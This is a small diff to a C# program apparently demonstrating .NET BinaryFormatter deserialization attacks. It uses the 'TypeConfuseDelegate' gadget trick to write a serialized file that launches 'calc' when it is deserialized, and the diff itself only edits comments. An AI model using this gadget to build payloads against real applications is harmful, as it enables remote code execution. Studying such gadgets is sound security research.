@@ -32,9 +32,10 @@ namespace HelloWorldDeserialization
             set.Add("calc");
             set.Add("adummy");
 
+            //Use the type confuse delegate trick
             TypeConfuseDelegate(d2);
-
-            // Test serialization.
+            
+            //Write the file
             BinaryFormatter fmt = new BinaryFormatter();
             FileStream fs = new FileStream("d:\\serialized.dat", FileMode.Create);
             fmt.Serialize(fs, set);
